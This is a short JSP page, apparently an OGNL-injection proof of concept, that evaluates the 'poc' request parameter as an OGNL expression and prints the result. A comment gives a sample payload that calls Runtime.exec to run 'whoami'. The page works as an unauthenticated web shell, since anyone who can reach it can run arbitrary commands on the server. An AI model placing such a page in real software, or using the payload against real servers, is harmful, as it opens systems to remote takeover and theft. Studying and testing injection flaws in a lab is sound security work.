<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="ognl.Ognl" %>
<%@ page import="ognl.OgnlContext" %>
<%@ page import="org.apache.commons.io.IOUtils" %>
<%@ page import="java.io.InputStream" %>

<%
    //    @java.lang.Runtime@getRuntime().exec('whoami').getInputStream()
    String poc = request.getParameter("poc");
    OgnlContext context = new OgnlContext();
    Object obj = Ognl.getValue(poc, context, context.getRoot());

    if (obj instanceof InputStream) {
        out.println(IOUtils.toString((InputStream) obj));
    } else {
        out.println(obj);
    }

    out.flush();
    out.close();
%>